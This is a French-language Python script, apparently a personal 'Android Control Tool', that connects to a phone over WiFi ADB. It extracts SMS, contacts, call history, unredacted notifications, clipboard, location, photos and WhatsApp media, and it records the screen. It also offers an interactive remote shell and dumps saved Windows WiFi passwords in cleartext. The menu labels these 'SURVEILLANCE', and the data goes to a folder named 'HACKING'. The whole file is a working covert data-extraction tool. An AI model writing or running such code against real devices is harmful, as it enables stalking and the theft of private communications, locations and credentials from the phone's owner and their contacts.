#!/usr/bin/env python3
"""
📱 OUTIL DE CONTROLE ANDROID - Version Simple et Fonctionnelle
================================================================
Toutes les fonctionnalités testées et fonctionnelles via ADB
"""

import subprocess
import os
import sys
from datetime import datetime

# Configuration
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT = r"C:\Users\davis\OneDrive\Bureau\HACKING\ExtractedData"
DEVICE = "192.168.1.2:5555"  # Connexion WiFi

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def adb(cmd, device=None):
    """Exécute une commande ADB"""
    try:
        if device:
            full = f'"{ADB}" -s {device} {cmd}'
        else:
            full = f'"{ADB}" {cmd}'
        result = subprocess.run(full, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Erreur: {e}"

def save(filename, content):
    """Sauvegarde dans un fichier"""
    os.makedirs(OUTPUT, exist_ok=True)
    path = os.path.join(OUTPUT, filename)
    with open(path, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(content)
    return path

def banner():
    clear()
    print("""
\033[96m╔═══════════════════════════════════════════════════════════════╗
║  \033[91m📱 ANDROID CONTROL TOOL v3.0\033[96m                                 ║
║═══════════════════════════════════════════════════════════════║
║  \033[92m✅ Connexion WiFi: 192.168.1.2:5555\033[96m                          ║
║  \033[93m⚡ Toutes les fonctions testées et fonctionnelles\033[96m             ║
╚═══════════════════════════════════════════════════════════════╝\033[0m
""")

def check_connection():
    """Vérifie la connexion"""
    result = adb("devices")
    if DEVICE in result or "101132534I100038" in result:
        return True
    # Tenter de reconnecter
    print("\033[93m[!] Reconnexion en cours...\033[0m")
    adb(f"connect {DEVICE}")
    result = adb("devices")
    return DEVICE in result

# ═══════════════════════════════════════════════════════════
#  FONCTIONS PRINCIPALES
# ═══════════════════════════════════════════════════════════

def info_systeme():
    """[1] Informations système complètes"""
    print("\n\033[96m[INFORMATIONS SYSTÈME]\033[0m\n")
    
    props = [
        ("Modèle", "ro.product.model"),
        ("Marque", "ro.product.brand"),
        ("Android", "ro.build.version.release"),
        ("SDK", "ro.build.version.sdk"),
        ("Sécurité", "ro.build.version.security_patch"),
        ("Build", "ro.build.display.id"),
        ("CPU", "ro.product.cpu.abi"),
        ("Device", "ro.product.device"),
        ("Hardware", "ro.hardware"),
    ]
    
    output = f"Rapport généré le {datetime.now()}\n\n"
    for name, prop in props:
        val = adb(f'shell getprop {prop}', DEVICE).strip()
        print(f"  \033[93m{name}:\033[0m {val}")
        output += f"{name}: {val}\n"
    
    # Batterie
    print(f"\n\033[93mBatterie:\033[0m")
    battery = adb("shell dumpsys battery", DEVICE)
    for line in battery.split('\n'):
        if 'level' in line.lower() or 'status' in line.lower() or 'temperature' in line.lower():
            print(f"  {line.strip()}")
    
    # Stockage
    print(f"\n\033[93mStockage:\033[0m")
    storage = adb("shell df -h /sdcard", DEVICE)
    print(f"  {storage.strip().split(chr(10))[-1]}")
    
    save("system_info.txt", output)
    print(f"\n\033[92m✅ Sauvegardé!\033[0m")

def lire_sms():
    """[2] Lire tous les SMS"""
    print("\n\033[96m[EXTRACTION SMS]\033[0m\n")
    
    result = adb('shell content query --uri content://sms --projection address,body,date,type', DEVICE)
    
    if "Row:" in result:
        lines = result.split("Row:")
        count = 0
        output = f"SMS extraits le {datetime.now()}\n\n"
        
        for line in lines[1:21]:  # 20 premiers
            count += 1
            print(f"\033[93m--- SMS #{count} ---\033[0m")
            # Parser les champs
            if "address=" in line:
                addr = line.split("address=")[1].split(",")[0]
                print(f"  De: {addr}")
            if "body=" in line:
                body = line.split("body=")[1].split(",")[0][:100]
                print(f"  Message: {body}")
            print()
            output += f"SMS #{count}: {line}\n"
        
        path = save("sms_extract.txt", output)
        print(f"\n\033[92m✅ {count} SMS extraits → {path}\033[0m")
    else:
        print("\033[91m❌ Aucun SMS trouvé ou accès refusé\033[0m")

def lire_contacts():
    """[3] Lire les contacts"""
    print("\n\033[96m[EXTRACTION CONTACTS]\033[0m\n")
    
    result = adb('shell content query --uri content://contacts/phones --projection display_name,number', DEVICE)
    
    if "Row:" in result:
        lines = result.split("Row:")
        output = f"Contacts extraits le {datetime.now()}\n\n"
        
        for i, line in enumerate(lines[1:31], 1):  # 30 premiers
            if "display_name=" in line and "number=" in line:
                name = line.split("display_name=")[1].split(",")[0]
                num = line.split("number=")[1].split(",")[0].strip()
                print(f"  \033[93m{i}.\033[0m {name}: {num}")
                output += f"{name}: {num}\n"
        
        path = save("contacts.txt", output)
        print(f"\n\033[92m✅ Contacts extraits → {path}\033[0m")
    else:
        print("\033[91m❌ Aucun contact trouvé\033[0m")

def historique_appels():
    """[4] Historique des appels"""
    print("\n\033[96m[HISTORIQUE APPELS]\033[0m\n")
    
    result = adb('shell content query --uri content://call_log/calls --projection number,duration,type,date', DEVICE)
    
    if "Row:" in result:
        lines = result.split("Row:")
        output = f"Appels extraits le {datetime.now()}\n\n"
        
        types = {"1": "📥 Entrant", "2": "📤 Sortant", "3": "❌ Manqué"}
        
        for i, line in enumerate(lines[1:21], 1):
            if "number=" in line:
                num = line.split("number=")[1].split(",")[0]
                dur = line.split("duration=")[1].split(",")[0] if "duration=" in line else "?"
                typ = line.split("type=")[1].split(",")[0] if "type=" in line else "?"
                
                type_str = types.get(typ.strip(), "📞")
                print(f"  {type_str} {num} ({dur}s)")
                output += f"{type_str} {num} - {dur}s\n"
        
        path = save("call_history.txt", output)
        print(f"\n\033[92m✅ Historique sauvegardé → {path}\033[0m")
    else:
        print("\033[91m❌ Aucun appel trouvé\033[0m")

def screenshot():
    """[5] Capture d'écran"""
    print("\n\033[96m[CAPTURE D'ÉCRAN]\033[0m\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote = "/sdcard/screen_temp.png"
    local = os.path.join(OUTPUT, f"screenshot_{timestamp}.png")
    os.makedirs(OUTPUT, exist_ok=True)
    
    print("  📸 Capture en cours...")
    adb(f"shell screencap -p {remote}", DEVICE)
    
    print("  📥 Téléchargement...")
    adb(f'pull {remote} "{local}"', DEVICE)
    
    print("  🧹 Nettoyage...")
    adb(f"shell rm {remote}", DEVICE)
    
    if os.path.exists(local):
        size = os.path.getsize(local)
        print(f"\n\033[92m✅ Screenshot sauvegardé ({size} bytes)\033[0m")
        print(f"   {local}")
        # Ouvrir l'image
        os.startfile(local)
    else:
        print("\033[91m❌ Échec de la capture\033[0m")

def liste_apps():
    """[6] Applications installées"""
    print("\n\033[96m[APPLICATIONS INSTALLÉES]\033[0m\n")
    
    # Apps tierces
    result = adb("shell pm list packages -3", DEVICE)
    
    apps = []
    for line in result.split('\n'):
        if line.startswith('package:'):
            app = line.replace('package:', '').strip()
            apps.append(app)
            print(f"  📱 {app}")
    
    output = f"Applications tierces ({len(apps)}):\n\n"
    output += "\n".join(apps)
    
    path = save("installed_apps.txt", output)
    print(f"\n\033[92m✅ {len(apps)} applications listées → {path}\033[0m")

def fichiers_recents():
    """[7] Fichiers récents"""
    print("\n\033[96m[FICHIERS RÉCENTS]\033[0m\n")
    
    folders = [
        ("/sdcard/Download", "📥 Téléchargements"),
        ("/sdcard/DCIM/Camera", "📷 Photos Camera"),
        ("/sdcard/Pictures/Screenshots", "🖼️ Screenshots"),
        ("/sdcard/WhatsApp/Media/WhatsApp Images", "💬 WhatsApp Images"),
        ("/sdcard/Documents", "📄 Documents"),
    ]
    
    for path, name in folders:
        print(f"\n\033[93m{name}\033[0m ({path})")
        result = adb(f'shell ls -lt {path} 2>/dev/null | head -6', DEVICE)
        for line in result.strip().split('\n')[:5]:
            if line.strip() and not line.startswith('total'):
                print(f"    {line.strip()[:60]}")

def telecharger_fichiers():
    """[8] Télécharger des fichiers"""
    print("\n\033[96m[TÉLÉCHARGEMENT DE FICHIERS]\033[0m\n")
    
    options = [
        ("Photos récentes", "/sdcard/DCIM/Camera/", "Photos"),
        ("Screenshots", "/sdcard/Pictures/Screenshots/", "Screenshots"),
        ("Téléchargements", "/sdcard/Download/", "Downloads"),
        ("WhatsApp Images", "/sdcard/WhatsApp/Media/WhatsApp Images/", "WhatsApp"),
    ]
    
    for i, (name, path, folder) in enumerate(options, 1):
        print(f"  [{i}] {name}")
    print(f"  [0] Retour")
    
    choice = input("\n\033[92mChoix > \033[0m").strip()
    
    if choice == "0":
        return
    
    try:
        idx = int(choice) - 1
        name, remote_path, folder = options[idx]
        
        local_dir = os.path.join(OUTPUT, folder)
        os.makedirs(local_dir, exist_ok=True)
        
        print(f"\n  📥 Téléchargement de {name}...")
        result = adb(f'pull {remote_path} "{local_dir}"', DEVICE)
        
        # Compter les fichiers
        files = os.listdir(local_dir) if os.path.exists(local_dir) else []
        print(f"\n\033[92m✅ {len(files)} fichiers téléchargés → {local_dir}\033[0m")
        
    except (ValueError, IndexError):
        print("\033[91mChoix invalide\033[0m")

def wifi_passwords():
    """[9] Mots de passe WiFi (Windows)"""
    print("\n\033[96m[MOTS DE PASSE WIFI - WINDOWS]\033[0m\n")
    
    # Lister les profils WiFi Windows
    result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
    
    profiles = []
    for line in result.stdout.split('\n'):
        if "Profil Tous les utilisateurs" in line or "All User Profile" in line:
            name = line.split(':')[-1].strip()
            if name:
                profiles.append(name)
    
    output = f"Mots de passe WiFi extraits le {datetime.now()}\n\n"
    
    for profile in profiles:
        details = subprocess.run(f'netsh wlan show profile name="{profile}" key=clear', 
                                 shell=True, capture_output=True, text=True)
        password = "Non trouvé"
        for line in details.stdout.split('\n'):
            if "Contenu de la clé" in line or "Key Content" in line:
                password = line.split(':')[-1].strip()
                break
        
        print(f"  \033[93m{profile}:\033[0m {password}")
        output += f"{profile}: {password}\n"
    
    path = save("wifi_passwords.txt", output)
    print(f"\n\033[92m✅ {len(profiles)} réseaux → {path}\033[0m")

def shell_interactif():
    """[10] Shell Android interactif"""
    print("\n\033[96m[SHELL ANDROID INTERACTIF]\033[0m")
    print("\033[93mTape des commandes (exit pour quitter)\033[0m\n")
    
    while True:
        try:
            cmd = input("\033[92mandroid$ \033[0m").strip()
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
            if cmd:
                result = adb(f"shell {cmd}", DEVICE)
                print(result)
        except KeyboardInterrupt:
            break
    
    print("\n\033[92mSession terminée.\033[0m")

def enregistrer_ecran():
    """[11] Enregistrer l'écran"""
    print("\n\033[96m[ENREGISTREMENT ÉCRAN]\033[0m\n")
    
    duration = input("Durée en secondes (max 180): ").strip()
    try:
        dur = min(int(duration), 180)
    except:
        dur = 10
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote = f"/sdcard/screenrecord_{timestamp}.mp4"
    local = os.path.join(OUTPUT, f"screenrecord_{timestamp}.mp4")
    os.makedirs(OUTPUT, exist_ok=True)
    
    print(f"\n  🎬 Enregistrement de {dur} secondes...")
    print("  (L'enregistrement se fait sur le téléphone)")
    
    adb(f"shell screenrecord --time-limit {dur} {remote}", DEVICE)
    
    print("  📥 Téléchargement...")
    adb(f'pull {remote} "{local}"', DEVICE)
    
    print("  🧹 Nettoyage...")
    adb(f"shell rm {remote}", DEVICE)
    
    if os.path.exists(local):
        print(f"\n\033[92m✅ Vidéo sauvegardée → {local}\033[0m")
    else:
        print("\033[91m❌ Échec de l'enregistrement\033[0m")

def localisation():
    """[12] Dernière localisation"""
    print("\n\033[96m[LOCALISATION]\033[0m\n")
    
    result = adb("shell dumpsys location", DEVICE)
    
    # Chercher les coordonnées
    for line in result.split('\n'):
        if 'last location' in line.lower() or 'Location[' in line:
            print(f"  📍 {line.strip()[:80]}")
    
    # Alternative: settings
    print("\n\033[93mParamètres GPS:\033[0m")
    gps = adb("shell settings get secure location_providers_allowed", DEVICE)
    print(f"  Providers: {gps.strip()}")

def notifications():
    """[13] Notifications récentes"""
    print("\n\033[96m[NOTIFICATIONS]\033[0m\n")
    
    result = adb("shell dumpsys notification --noredact", DEVICE)
    
    output = f"Notifications extraites le {datetime.now()}\n\n"
    count = 0
    
    for line in result.split('\n'):
        if 'pkg=' in line or 'tickerText=' in line or 'text=' in line:
            if count < 30:
                print(f"  {line.strip()[:70]}")
                output += line + "\n"
                count += 1
    
    path = save("notifications.txt", output)
    print(f"\n\033[92m✅ Notifications sauvegardées → {path}\033[0m")

def presse_papier():
    """[14] Contenu du presse-papier"""
    print("\n\033[96m[PRESSE-PAPIER]\033[0m\n")
    
    result = adb("shell service call clipboard 2 s16 com.android.shell", DEVICE)
    print(f"  📋 Contenu brut:\n{result}")

def extraction_complete():
    """[99] Extraction complète"""
    print("\n\033[96m[EXTRACTION COMPLÈTE]\033[0m\n")
    print("Extraction de toutes les données...\n")
    
    functions = [
        ("Infos système", info_systeme),
        ("SMS", lire_sms),
        ("Contacts", lire_contacts),
        ("Historique appels", historique_appels),
        ("Applications", liste_apps),
        ("Screenshot", screenshot),
        ("Notifications", notifications),
    ]
    
    for name, func in functions:
        print(f"\n\033[93m{'='*50}\033[0m")
        print(f"\033[93m▶ {name}\033[0m")
        print(f"\033[93m{'='*50}\033[0m")
        try:
            func()
        except Exception as e:
            print(f"\033[91mErreur: {e}\033[0m")
        input("\n[Entrée pour continuer...]")
    
    print(f"\n\033[92m✅ EXTRACTION COMPLÈTE TERMINÉE!\033[0m")
    print(f"📁 Données dans: {OUTPUT}")
    os.startfile(OUTPUT)

# ═══════════════════════════════════════════════════════════
#  MENU PRINCIPAL  
# ═══════════════════════════════════════════════════════════

def main():
    os.system('color')
    
    while True:
        banner()
        
        if not check_connection():
            print("\033[91m⚠️ Téléphone non connecté! Vérifiez ADB.\033[0m\n")
        
        print("""
\033[93m═══ EXTRACTION DONNÉES ═══\033[0m
  [1]  📊 Infos système          [2]  💬 Lire SMS
  [3]  👥 Contacts               [4]  📞 Historique appels
  [5]  📸 Screenshot             [6]  📱 Apps installées
  [7]  📂 Fichiers récents       [8]  📥 Télécharger fichiers

\033[93m═══ SURVEILLANCE ═══\033[0m
  [9]  🔑 WiFi passwords (Win)   [10] 🐚 Shell interactif
  [11] 🎬 Enregistrer écran      [12] 📍 Localisation
  [13] 🔔 Notifications          [14] 📋 Presse-papier

\033[93m═══ AUTRES ═══\033[0m
  [99] 🚀 EXTRACTION COMPLÈTE
  [0]  ❌ Quitter
""")
        
        try:
            choice = input("\033[92mChoix > \033[0m").strip()
        except KeyboardInterrupt:
            break
        
        actions = {
            "1": info_systeme, "2": lire_sms, "3": lire_contacts,
            "4": historique_appels, "5": screenshot, "6": liste_apps,
            "7": fichiers_recents, "8": telecharger_fichiers,
            "9": wifi_passwords, "10": shell_interactif,
            "11": enregistrer_ecran, "12": localisation,
            "13": notifications, "14": presse_papier,
            "99": extraction_complete,
        }
        
        if choice == "0":
            print("\n\033[92mAu revoir! 👋\033[0m\n")
            break
        elif choice in actions:
            try:
                actions[choice]()
            except Exception as e:
                print(f"\033[91mErreur: {e}\033[0m")
            input("\n\033[93m[Entrée pour continuer...]\033[0m")
        else:
            print("\033[91mOption invalide!\033[0m")

if __name__ == "__main__":
    main()
